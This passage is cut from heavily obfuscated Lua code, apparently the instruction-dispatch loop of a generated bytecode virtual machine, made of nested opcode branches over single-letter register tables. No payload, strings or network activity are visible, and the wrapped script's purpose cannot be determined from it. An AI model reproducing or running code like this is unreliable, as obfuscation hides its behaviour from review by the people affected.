m=(e+1),y[131]do t(c,w[m])end;end end end end end end a=(a+1)end else local a,c=0 while true do if(a<10 or a==10)then if(a<4 or a==4)then if(a<=1)then if not(a==1)then c=nil else w[y[654]]=w[y[131]][y[216]];end else if a<=2 then n=(n+1);else if(4>a)then y=f[n];else w[y[654]]=y[131];end end end else if(a<7 or a==7)then if(a<=5)then n=n+1;else if not(7==a)then y=f[n];else w[y[654]]=h[y[131]];end end else if(a<8 or a==8)then n=n+1;else if not(a==10)then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if a<=16 then if a<=13 then if(a==11 or a<11)then n=(n+1);else if(a==12)then y=f[n];else c=y[654];end end else if(a==14 or a<14)then do return w[c](r(w,(c+1),y[131]))end;else if a~=16 then n=(n+1);else y=f[n];end end end else if(a<=19)then if(a<17 or a==17)then c=y[654];else if not(19==a)then do return r(w,c,p)end;else n=(n+1);end end else if(a<20 or a==20)then y=f[n];else if(22~=a)then n=y[131];else break end end end end end a=a+1 end end;elseif(z==250 or z<250)then if(z<247 or z==247)then if(245>z or 245==z)then local a,c=0 while true do if(a<10 or a==10)then if a<=4 then if(a==1 or a<1)then if(1~=a)then c=nil else w={};end else if(a<2 or a==2)then for e=0,u,1 do if(e<o)then w[e]=s[(e+1)];else break;end;end;else if(4>a)then n=(n+1);else y=f[n];end end end else if(a<7 or a==7)then if a<=5 then w[y[654]]=h[y[131]];else if a>6 then y=f[n];else n=n+1;end end else if(a==8 or a<8)then w[y[654]]=w[y[131]][y[216]];else if a<10 then n=(n+1);else y=f[n];end end end end else if(a<16 or a==16)then if(a==13 or a<13)then if(a<=11)then w[y[654]]=h[y[131]];else if not(12~=a)then n=(n+1);else y=f[n];end end else if(a<=14)then w[y[654]]=h[y[131]];else if(a<16)then n=(n+1);else y=f[n];end end end else if a<=19 then if(a<17 or a==17)then w[y[654]]=w[y[131]][w[y[216]]];else if a>18 then y=f[n];else n=n+1;end end else if(a<20 or a==20)then c=y[654]else if not(a~=21)then w[c](w[c+1])else break end end end end end a=(a+1)end elseif not(not(247~=z))then local a,c=0 while true do if a<=7 then if a<=3 then if(a==1 or a<1)then if not(a==1)then c=nil else w[y[654]]=h[y[131]];end else if(2==a)then n=n+1;else y=f[n];end end else if(a<5 or a==5)then if 4<a then n=n+1;else w[y[654]]=w[y[131]][y[216]];end else if(7~=a)then y=f[n];else w[y[654]]=y[131];end end end else if(a==11 or a<11)then if(a<9 or a==9)then if a<9 then n=(n+1);else y=f[n];end else if 10<a then n=(n+1);else w[y[654]]=y[131];end end else if a<=13 then if 12<a then c=y[654]else y=f[n];end else if not(a==15)then w[c]=w[c](r(w,(c+1),y[131]))else break end end end end a=a+1 end else local a,c=0 while true do if a<=7 then if(a<3 or a==3)then if a<=1 then if(0==a)then c=nil else w[y[654]]=h[y[131]];end else if not(2~=a)then n=(n+1);else y=f[n];end end else if(a==5 or a<5)then if(5~=a)then w[y[654]]=y[131];else n=(n+1);end else if a==6 then y=f[n];else w[y[654]]=y[131];end end end else if(a<=11)then if(a==9 or a<9)then if 8<a then y=f[n];else n=(n+1);end else if a>10 then n=(n+1);else w[y[654]]=y[131];end end else if a<=13 then if(12<a)then c=y[654]else y=f[n];end else if 14==a then w[c]=w[c](r(w,c+1,y[131]))else break end end end end a=a+1 end end;elseif(248>z or 248==z)then local a=0 while true do if(a<=9)then if(a<4 or(a==4))then if(a==1 or a<1)then if(not(a==1))then w[y[654]]=h[y[131]];else n=(n+1);end else if(a<=2)then y=f[n];else if(a>3)then n=(n+1);else w[y[654]]=w[y[131]][y[216]];end end end else if(a<6 or a==6)then if not(a==6)then y=f[n];else w[y[654]]=h[y[131]];end else if(a<7 or a==7)then n=n+1;else if not(8~=a)then y=f[n];else w[y[654]]=h[y[131]];end end end end else if a<=14 then if(a<11 or a==11)then if not(a~=10)then n=(n+1);else y=f[n];end else if(a==12 or a<12)then w[y[654]]=w[y[131]][y[216]];else if not(a~=13)then n=(n+1);else y=f[n];end end end else if(a<=16)then if(15<a)then n=n+1;else w[y[654]]=w[y[131]][w[y[216]]];end else if((a<17)or not(a~=17))then y=f[n];else if(a==18)then if(w[y[654]]~=y[216])then n=(n+1);else n=y[131];end;else break end end end end end a=(a+1)end elseif not(249~=z)then local a,c=0 while true do if a<=12 then if(a<=5)then if(a<2 or a==2)then if(a==0 or a<0)then c=nil else if not(1~=a)then w={};else for e=0,u,1 do if e<o then w[e]=s[e+1];else break;end;end;end end else if(a<3 or a==3)then n=n+1;else if(a<5)then y=f[n];else w[y[654]]=false;end end end else if(a==8 or a<8)then if(a==6 or a<6)then n=(n+1);else if not(a==8)then y=f[n];else w[y[654]]=j[y[131]];end end else if(a==10 or a<10)then if a<10 then n=(n+1);else y=f[n];end else if not(12==a)then for e=y[654],y[131],1 do w[e]=nil;end;else n=n+1;end end end end else if a<=18 then if a<=15 then if(a<=13)then y=f[n];else if not(a~=14)then w[y[654]]=h[y[131]];else n=n+1;end end else if(a<=16)then y=f[n];else if not(a==18)then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end end end else if(a==21 or a<21)then if a<=19 then y=f[n];else if 21~=a then w[y[654]]=w[y[131]];else n=n+1;end end else if a<=23 then if 23>a then y=f[n];else c=y[654]end else if(a<25)then w[c]=w[c](w[c+1])else break end end end end end a=(a+1)end else local a=0 while true do if a<=7 then if(a<3 or a==3)then if(a<1 or a==1)then if a<1 then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end else if(a~=3)then y=f[n];else w[y[654]][y[131]]=w[y[216]];end end else if(a<=5)then if(5>a)then n=(n+1);else y=f[n];end else if(7>a)then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end end end else if(a==11 or a<11)then if a<=9 then if 8<a then w[y[654]]=h[y[131]];else y=f[n];end else if(11~=a)then n=(n+1);else y=f[n];end end else if(a<13 or a==13)then if a>12 then n=(n+1);else w[y[654]]=w[y[131]][y[216]];end else if(a==14 or a<14)then y=f[n];else if(16>a)then if(not(w[y[654]]==w[y[216]]))then n=n+1;else n=y[131];end;else break end end end end end a=a+1 end end;elseif(z<253 or z==253)then if(z<=251)then local a,c,e=0 while true do if(a<=24)then if(a<11 or a==11)then if(not(a~=5)or a<5)then if(a==2 or a<2)then if(a<=0)then c=nil else if 1<a then w[y[654]]={};else e=nil end end else if(a<3 or a==3)then n=(n+1);else if(not(a==5))then y=f[n];else w[y[654]]=h[y[131]];end end end else if(a<=8)then if(a==6 or a<6)then n=(n+1);else if not(not(a~=8))then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end else if(a==9 or a<9)then n=(n+1);else if(10<a)then w[y[654]]=h[y[131]];else y=f[n];end end end end else if(a<=17)then if(a==14 or a<14)then if((a<12)or a==12)then n=(n+1);else if not(14==a)then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end else if(a<15 or a==15)then n=(n+1);else if(a>16)then w[y[654]]=w[y[131]][y[216]];else y=f[n];end end end else if(a<=20)then if(a==18 or a<18)then n=(n+1);else if(not(a~=19))then y=f[n];else w[y[654]]={};end end else if(a<=22)then if 21<a then y=f[n];else n=(n+1);end else if(a>23)then n=(n+1);else w[y[654]]={};end end end end end else if(a==37 or a<37)then if(a<=30)then if(a<27 or a==27)then if(a<=25)then y=f[n];else if a<27 then w[y[654]]=h[y[131]];else n=(n+1);end end else if(a<28 or a==28)then y=f[n];else if(30>a)then w[y[654]][y[131]]=w[y[216]];else n=(n+1);end end end else if(a==33 or a<33)then if(a==31 or a<31)then y=f[n];else if(a<33)then w[y[654]]=h[y[131]];else n=(n+1);end end else if(a<35 or a==35)then if 34<a then w[y[654]][y[131]]=w[y[216]];else y=f[n];end else if not(a==37)then n=(n+1);else y=f[n];end end end end else if(a==43 or a<43)then if(a==40 or a<40)then if(a<=38)then w[y[654]][y[131]]=w[y[216]];else if 39<a then y=f[n];else n=(n+1);end end else if(a==41 or a<41)then w[y[654]]={r({},1,y[131])};else if(a>42)then y=f[n];else n=(n+1);end end end else if(a<46 or a==46)then if((a<44)or not(a~=44))then w[y[654]]=w[y[131]];else if(45<a)then y=f[n];else n=(n+1);end end else if(a==48 or a<48)then if(48>a)then e=y[654];else c=w[e];end else if not(not(a==49))then for m=e+1,y[131]do t(c,w[m])end;else break end end end end end end a=a+1 end elseif(z>252)then local a=0 while true do if(a==6 or a<6)then if a<=2 then if a<=0 then w[y[654]]=w[y[131]][y[216]];else if(2~=a)then n=n+1;else y=f[n];end end else if(a<=4)then if(a~=4)then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if(a<6)then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if a<=9 then if(a==7 or a<7)then n=n+1;else if(8==a)then y=f[n];else w[y[654]][y[131]]=w[y[216]];end end else if a<=11 then if(11>a)then n=n+1;else y=f[n];end else if not(a==13)then n=y[131];else break end end end end a=a+1 end else local a=w[y[216]];if not a then n=n+1;else w[y[654]]=a;n=y[131];end;end;elseif(254>z or not(254~=z))then local a,c=0 while true do if(a==16 or a<16)then if(a<=7)then if(a<=3)then if(a<=1)then if a>0 then w[y[654]]=w[y[131]][y[216]];else c=nil end else if a<3 then n=n+1;else y=f[n];end end else if a<=5 then if(a~=5)then w[y[654]]=h[y[131]];else n=n+1;end else if a<7 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if(a<11 or a==11)then if(a<9 or a==9)then if not(a~=8)then n=n+1;else y=f[n];end else if a<11 then w[y[654]]={};else n=(n+1);end end else if a<=13 then if not(13==a)then y=f[n];else w[y[654]]=h[y[131]];end else if(a==14 or a<14)then n=(n+1);else if(a~=16)then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end end else if(a==24 or a<24)then if(a==20 or a<20)then if a<=18 then if(a~=18)then n=(n+1);else y=f[n];end else if(a<20)then w[y[654]]=h[y[131]];else n=(n+1);end end else if(a==22 or a<22)then if not(22==a)then y=f[n];else w[y[654]]={};end else if a==23 then n=(n+1);else y=f[n];end end end else if a<=28 then if(a==26 or a<26)then if(25<a)then n=(n+1);else w[y[654]]=h[y[131]];end else if a<28 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end else if(a<=30)then if(a>29)then y=f[n];else n=(n+1);end else if(a<=31)then c=y[654]else if 33>a then w[c]=w[c]()else break end end end end end end a=(a+1)end elseif(not(255~=z))then local a,c=0 while true do if a<=7 then if a<=3 then if(a<=1)then if(1~=a)then c=nil else w[y[654]]=w[y[131]][y[216]];end else if(a>2)then y=f[n];else n=(n+1);end end else if(a<=5)then if(a~=5)then w[y[654]]=w[y[131]];else n=n+1;end else if a~=7 then y=f[n];else w[y[654]]=h[y[131]];end end end else if(a<=11)then if(a<9 or a==9)then if(a<9)then n=n+1;else y=f[n];end else if(a==10)then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end else if(a==13 or a<13)then if 13~=a then y=f[n];else c=y[654]end else if 14==a then w[c]=w[c](r(w,c+1,y[131]))else break end end end end a=(a+1)end else w[y[654]]={r({},1,y[131])};end;elseif(268>z or 268==z)then if(262==z or 262>z)then if z<=259 then if(257>z or 257==z)then local a,c,e,m=0 while true do if a<=13 then if a<=6 then if a<=2 then if a<=0 then c=nil else if a==1 then e=nil else m=nil end end else if a<=4 then if 3==a then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if a~=6 then y=f[n];else w[y[654]]=h[y[131]];end end end else if a<=9 then if a<=7 then n=n+1;else if 8<a then w[y[654]]=w[y[131]][y[216]];else y=f[n];end end else if a<=11 then if 10==a then n=n+1;else y=f[n];end else if 12==a then w[y[654]]=w[y[131]][w[y[216]]];else n=n+1;end end end end else if a<=20 then if a<=16 then if a<=14 then y=f[n];else if a>15 then n=n+1;else w[y[654]]=h[y[131]];end end else if a<=18 then if 17==a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if 19==a then n=n+1;else y=f[n];end end end else if a<=24 then if a<=22 then if 22>a then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if a>23 then m=y[131];else y=f[n];end end else if a<=26 then if a~=26 then e=y[216];else c=k(w,g,m,e);end else if a<28 then w[y[654]]=c;else break end end end end end a=a+1 end elseif z==258 then local a=y[654]w[a]=w[a](r(w,(a+1),p))else do return end;end;elseif(260==z or 260>z)then local a,c,e,m=0 while true do if(a==10 or a<10)then if(a==4 or a<4)then if(a<1 or a==1)then if not(0~=a)then c=nil else e=nil end else if(a<=2)then m=nil else if a==3 then w[y[654]]=h[y[131]];else n=(n+1);end end end else if(a<7 or a==7)then if a<=5 then y=f[n];else if(a<7)then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end end else if(a<=8)then y=f[n];else if a==9 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end end end else if(a<16 or a==16)then if(a<=13)then if(a==11 or a<11)then y=f[n];else if(12==a)then w[y[654]]=h[y[131]];else n=(n+1);end end else if(a<14 or a==14)then y=f[n];else if 15<a then n=n+1;else w[y[654]]=w[y[131]][y[216]];end end end else if(a<=19)then if a<=17 then y=f[n];else if(a<19)then m=y[131];else e=y[216];end end else if(a==20 or a<20)then c=k(w,g,m,e);else if not(a~=21)then w[y[654]]=c;else break end end end end end a=(a+1)end elseif(262>z)then local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1~=a then c=nil else e=nil end else if a<=2 then m=nil else if a==3 then w[y[654]]=h[y[131]];else n=n+1;end end end else if a<=6 then if 5==a then y=f[n];else w[y[654]]=h[y[131]];end else if a<=7 then n=n+1;else if 8<a then w[y[654]]=w[y[131]][y[216]];else y=f[n];end end end end else if a<=14 then if a<=11 then if a~=11 then n=n+1;else y=f[n];end else if a<=12 then w[y[654]]=w[y[131]][w[y[216]]];else if a<14 then n=n+1;else y=f[n];end end end else if a<=16 then if 16~=a then m=y[654]else e={w[m](w[m+1])};end else if a<=17 then c=0;else if 18<a then break else for q=m,y[216]do c=c+1;w[q]=e[c];end end end end end end a=a+1 end else local a,c,e=0 while true do if a<=24 then if a<=11 then if a<=5 then if a<=2 then if a<=0 then c=nil else if a>1 then w[y[654]]={};else e=nil end end else if a<=3 then n=n+1;else if 5>a then y=f[n];else w[y[654]]=h[y[131]];end end end else if a<=8 then if a<=6 then n=n+1;else if a==7 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end else if a<=9 then n=n+1;else if a==10 then y=f[n];else w[y[654]]=h[y[131]];end end end end else if a<=17 then if a<=14 then if a<=12 then n=n+1;else if a>13 then w[y[654]]=w[y[131]][y[216]];else y=f[n];end end else if a<=15 then n=n+1;else if a==16 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if a<=20 then if a<=18 then n=n+1;else if a<20 then y=f[n];else w[y[654]]={};end end else if a<=22 then if 22>a then n=n+1;else y=f[n];end else if a~=24 then w[y[654]]={};else n=n+1;end end end end end else if a<=37 then if a<=30 then if a<=27 then if a<=25 then y=f[n];else if a~=27 then w[y[654]]=h[y[131]];else n=n+1;end end else if a<=28 then y=f[n];else if a~=30 then w[y[654]][y[131]]=w[y[216]];else n=n+1;end end end else if a<=33 then if a<=31 then y=f[n];else if a~=33 then w[y[654]]=h[y[131]];else n=n+1;end end else if a<=35 then if a<35 then y=f[n];else w[y[654]][y[131]]=w[y[216]];end else if a==36 then n=n+1;else y=f[n];end end end end else if a<=43 then if a<=40 then if a<=38 then w[y[654]][y[131]]=w[y[216]];else if a~=40 then n=n+1;else y=f[n];end end else if a<=41 then w[y[654]]={r({},1,y[131])};else if a~=43 then n=n+1;else y=f[n];end end end else if a<=46 then if a<=44 then w[y[654]]=w[y[131]];else if a<46 then n=n+1;else y=f[n];end end else if a<=48 then if a~=48 then e=y[654];else c=w[e];end else if 49==a then for m=e+1,y[131]do t(c,w[m])end;else break end end end end end end a=a+1 end end;elseif(265==z or 265>z)then if(z==263 or z<263)then local a=y[654]w[a](r(w,a+1,y[131]))elseif 265>z then local a=0 while true do if a<=6 then if a<=2 then if a<=0 then w[y[654]]=w[y[131]][y[216]];else if a~=2 then n=n+1;else y=f[n];end end else if a<=4 then if 3==a then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if 5==a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if a<=9 then if a<=7 then n=n+1;else if a~=9 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end else if a<=11 then if a~=11 then n=n+1;else y=f[n];end else if a<13 then if w[y[654]]then n=n+1;else n=y[131];end;else break end end end end a=a+1 end else w[y[654]]=(w[y[131]]/y[216]);end;elseif(266==z or 266>z)then local a,c=0 while true do if(a<=7)then if(a<=3)then if(a<1 or a==1)then if a<1 then c=nil else w[y[654]]=h[y[131]];end else if not(a~=2)then n=n+1;else y=f[n];end end else if a<=5 then if(a==4)then w[y[654]]=y[131];else n=(n+1);end else if a<7 then y=f[n];else w[y[654]]=y[131];end end end else if(a<11 or a==11)then if(a<=9)then if a<9 then n=(n+1);else y=f[n];end else if 11>a then w[y[654]]=y[131];else n=n+1;end end else if(a==13 or a<13)then if(12<a)then c=y[654]else y=f[n];end else if a<15 then w[c]=w[c](r(w,c+1,y[131]))else break end end end end a=(a+1)end elseif not(268==z)then local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if 0==a then c=nil else e=nil end else if a<=2 then m=nil else if 4~=a then w[y[654]]=j[y[131]];else n=n+1;end end end else if a<=6 then if a<6 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if a<=7 then n=n+1;else if a==8 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if a<=14 then if a<=11 then if a==10 then n=n+1;else y=f[n];end else if a<=12 then w[y[654]]=w[y[131]][y[216]];else if 14>a then n=n+1;else y=f[n];end end end else if a<=16 then if a>15 then e={w[m](w[m+1])};else m=y[654]end else if a<=17 then c=0;else if 19~=a then for q=m,y[216]do c=c+1;w[q]=e[c];end else break end end end end end a=a+1 end else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 0<a then w[y[654]]=w[y[131]];else c=nil end else if a<3 then n=n+1;else y=f[n];end end else if a<=5 then if 4==a then w[y[654]]=y[131];else n=n+1;end else if 6<a then w[y[654]]=y[131];else y=f[n];end end end else if a<=11 then if a<=9 then if 8<a then y=f[n];else n=n+1;end else if a~=11 then w[y[654]]=y[131];else n=n+1;end end else if a<=13 then if 12<a then c=y[654]else y=f[n];end else if a==14 then w[c]=w[c](r(w,c+1,y[131]))else break end end end end a=a+1 end end;elseif(z<=274)then if(z==271 or z<271)then if z<=269 then local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if a~=1 then c=nil else e=nil end else if a<=2 then m=nil else if a>3 then n=n+1;else w[y[654]]=h[y[131]];end end end else if a<=6 then if 5==a then y=f[n];else w[y[654]]=h[y[131]];end else if a<=7 then n=n+1;else if 8<a then w[y[654]]=w[y[131]][y[216]];else y=f[n];end end end end else if a<=14 then if a<=11 then if 11~=a then n=n+1;else y=f[n];end else if a<=12 then w[y[654]]=w[y[131]][w[y[216]]];else if a~=14 then n=n+1;else y=f[n];end end end else if a<=16 then if 16>a then m=y[654]else e={w[m](w[m+1])};end else if a<=17 then c=0;else if 18<a then break else for q=m,y[216]do c=c+1;w[q]=e[c];end end end end end end a=a+1 end elseif not(z==271)then local a,c=0 while true do if a<=14 then if a<=6 then if a<=2 then if a<=0 then c=nil else if a~=2 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end else if a<=4 then if 3<a then w[y[654]]=w[y[131]][y[216]];else y=f[n];end else if 5<a then y=f[n];else n=n+1;end end end else if a<=10 then if a<=8 then if a<8 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if 9<a then w[y[654]]=w[y[131]]*y[216];else y=f[n];end end else if a<=12 then if a~=12 then n=n+1;else y=f[n];end else if a==13 then w[y[654]]=w[y[131]]+w[y[216]];else n=n+1;end end end end else if a<=22 then if a<=18 then if a<=16 then if 15==a then y=f[n];else w[y[654]]=j[y[131]];end else if 17<a then y=f[n];else n=n+1;end end else if a<=20 then if a==19 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if a<22 then y=f[n];else w[y[654]]=w[y[131]];end end end else if a<=26 then if a<=24 then if a~=24 then n=n+1;else y=f[n];end else if a==25 then w[y[654]]=w[y[131]]+w[y[216]];else n=n+1;end end else if a<=28 then if a==27 then y=f[n];else c=y[654]end else if a~=30 then w[c]=w[c](r(w,c+1,y[131]))else break end end end end end a=a+1 end else local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if a>0 then w[y[654]]=w[y[131]][y[216]];else c=nil end else if 3>a then n=n+1;else y=f[n];end end else if a<=5 then if a>4 then n=n+1;else w[y[654]]=h[y[131]];end else if a<=6 then y=f[n];else if a==7 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end end end else if a<=13 then if a<=10 then if 9==a then y=f[n];else w[y[654]]=y[131];end else if a<=11 then n=n+1;else if a<13 then y=f[n];else w[y[654]]=y[131];end end end else if a<=15 then if a~=15 then n=n+1;else y=f[n];end else if a<=16 then c=y[654]else if a<18 then w[c]=w[c](r(w,c+1,y[131]))else break end end end end end a=a+1 end end;elseif(272>z or 272==z)then if(y[654]<w[y[216]])then n=(n+1);else n=y[131];end;elseif not(273~=z)then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a<1 then c=nil else w[y[654]]=w[y[131]][y[216]];end else if 3>a then n=n+1;else y=f[n];end end else if a<=5 then if a>4 then n=n+1;else w[y[654]]=y[131];end else if a~=7 then y=f[n];else w[y[654]]=h[y[131]];end end end else if a<=11 then if a<=9 then if a==8 then n=n+1;else y=f[n];end else if 11>a then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end else if a<=13 then if 13~=a then y=f[n];else c=y[654]end else if 15>a then w[c]=w[c](r(w,c+1,y[131]))else break end end end end a=a+1 end else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a<1 then c=nil else w[y[654]]=h[y[131]];end else if a<3 then n=n+1;else y=f[n];end end else if a<=5 then if 4==a then w[y[654]]=y[131];else n=n+1;end else if a==6 then y=f[n];else w[y[654]]=y[131];end end end else if a<=11 then if a<=9 then if 8<a then y=f[n];else n=n+1;end else if a<11 then w[y[654]]=y[131];else n=n+1;end end else if a<=13 then if a==12 then y=f[n];else c=y[654]end else if 14==a then w[c]=w[c](r(w,c+1,y[131]))else break end end end end a=a+1 end end;elseif(277>z or 277==z)then if(z==275 or z<275)then local a,c=0 while true do if a<=8 then if a<=3 then if(a==1 or a<1)then if(a<1)then c=nil else w[y[654]]=j[y[131]];end else if not(a==3)then n=n+1;else y=f[n];end end else if a<=5 then if not(a~=4)then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end else if(a<=6)then y=f[n];else if 8>a then w[y[654]]=y[131];else n=(n+1);end end end end else if a<=13 then if(a<=10)then if(a==9)then y=f[n];else w[y[654]]=y[131];end else if(a<11 or a==11)then n=(n+1);else if(a~=13)then y=f[n];else w[y[654]]=y[131];end end end else if a<=15 then if a<15 then n=(n+1);else y=f[n];end else if(a<=16)then c=y[654]else if not(17~=a)then w[c]=w[c](r(w,(c+1),y[131]))else break end end end end end a=(a+1)end elseif z<277 then local a,c=0 while true do if a<=13 then if a<=6 then if a<=2 then if a<=0 then c=nil else if 1<a then n=n+1;else w[y[654]]={};end end else if a<=4 then if a==3 then y=f[n];else w[y[654]]=h[y[131]];end else if 6~=a then n=n+1;else y=f[n];end end end else if a<=9 then if a<=7 then w[y[654]]=w[y[131]][y[216]];else if a<9 then n=n+1;else y=f[n];end end else if a<=11 then if 11~=a then w[y[654]][y[131]]=w[y[216]];else n=n+1;end else if 12<a then w[y[654]]=j[y[131]];else y=f[n];end end end end else if a<=20 then if a<=16 then if a<=14 then n=n+1;else if 16>a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end else if a<=18 then if 17==a then n=n+1;else y=f[n];end else if a>19 then n=n+1;else w[y[654]]=j[y[131]];end end end else if a<=23 then if a<=21 then y=f[n];else if a~=23 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end else if a<=25 then if a~=25 then y=f[n];else c=y[654]end else if 26==a then w[c]=w[c]()else break end end end end end a=a+1 end else local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if 0<a then w[y[654]]=w[y[131]][y[216]];else c=nil end else if 2<a then y=f[n];else n=n+1;end end else if a<=5 then if a~=5 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if a<=6 then y=f[n];else if a~=8 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end end end else if a<=13 then if a<=10 then if 9==a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if a<=11 then n=n+1;else if 12<a then w[y[654]]=false;else y=f[n];end end end else if a<=15 then if 15>a then n=n+1;else y=f[n];end else if a<=16 then c=y[654]else if a==17 then w[c](w[c+1])else break end end end end end a=a+1 end end;elseif z<=278 then w[y[654]]=w[y[131]]+y[216];elseif z==279 then w[y[654]]=j[y[131]];else local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if a~=1 then c=nil else e=nil end else if a<=2 then m=nil else if 4>a then w[y[654]]=h[y[131]];else n=n+1;end end end else if a<=6 then if a==5 then y=f[n];else w[y[654]]=h[y[131]];end else if a<=7 then n=n+1;else if a==8 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if a<=14 then if a<=11 then if a~=11 then n=n+1;else y=f[n];end else if a<=12 then w[y[654]]=w[y[131]][w[y[216]]];else if 13==a then n=n+1;else y=f[n];end end end else if a<=16 then if a>15 then e={w[m](w[m+1])};else m=y[654]end else if a<=17 then c=0;else if a>18 then break else for q=m,y[216]do c=c+1;w[q]=e[c];end end end end end end a=a+1 end end;elseif z<=327 then if z<=303 then if 291>=z then if 285>=z then if 282>=z then if 281<z then local a;local c;local e;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];e=y[654]c={w[e](w[e+1])};a=0;for m=e,y[216]do a=a+1;w[m]=c[a];end else local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];a=y[654]w[a]=w[a](r(w,a+1,y[131]))end;elseif 283>=z then local a=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1>a then w[y[654]][y[131]]=y[216];else n=n+1;end else if a<=2 then y=f[n];else if 4>a then w[y[654]]={};else n=n+1;end end end else if a<=6 then if a<6 then y=f[n];else w[y[654]][y[131]]=w[y[216]];end else if a<=7 then n=n+1;else if 9~=a then y=f[n];else w[y[654]]=h[y[131]];end end end end else if a<=14 then if a<=11 then if 10<a then y=f[n];else n=n+1;end else if a<=12 then w[y[654]]=w[y[131]][y[216]];else if a==13 then n=n+1;else y=f[n];end end end else if a<=16 then if a==15 then w[y[654]][y[131]]=w[y[216]];else n=n+1;end else if a<=17 then y=f[n];else if 18==a then w[y[654]][y[131]]=w[y[216]];else break end end end end end a=a+1 end elseif z==284 then local a=w[y[654]]+y[216];w[y[654]]=a;if(a<=w[y[654]+1])then n=y[131];end;else local a=y[654]local c,e=i(w[a](w[a+1]))p=e+a-1 local e=0;for m=a,p do e=e+1;w[m]=c[e];end;end;elseif 288>=z then if(z==286 or z<286)then local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if a<1 then c=nil else w[y[654]]=w[y[131]][y[216]];end else if a~=3 then n=n+1;else y=f[n];end end else if a<=5 then if a==4 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if a<=6 then y=f[n];else if 7<a then n=n+1;else w[y[654]]=w[y[131]][y[216]];end end end end else if a<=13 then if a<=10 then if 9<a then w[y[654]]=w[y[131]][y[216]];else y=f[n];end else if a<=11 then n=n+1;else if 13>a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if a<=15 then if a~=15 then n=n+1;else y=f[n];end else if a<=16 then c=y[654]else if 18>a then w[c]=w[c](w[c+1])else break end end end end end a=a+1 end elseif(287<z)then local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if 1~=a then c=nil else w[y[654]]=w[y[131]][y[216]];end else if 3>a then n=n+1;else y=f[n];end end else if a<=5 then if a==4 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if a<=6 then y=f[n];else if 7<a then n=n+1;else w[y[654]]=w[y[131]][y[216]];end end end end else if a<=13 then if a<=10 then if 10>a then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if a<=11 then n=n+1;else if a<13 then y=f[n];else w[y[654]]=false;end end end else if a<=15 then if 15~=a then n=n+1;else y=f[n];end else if a<=16 then c=y[654]else if 17<a then break else w[c](w[c+1])end end end end end a=a+1 end else for a=y[654],y[131],1 do w[a]=nil;end;end;elseif 289>=z then w[y[654]]=w[y[131]][y[216]];elseif z==290 then local a;w[y[654]]={};n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];a=y[654]w[a]=w[a]()else w[y[654]][w[y[131]]]=w[y[216]];end;elseif z<=297 then if(294==z or 294>z)then if(z==292 or z<292)then 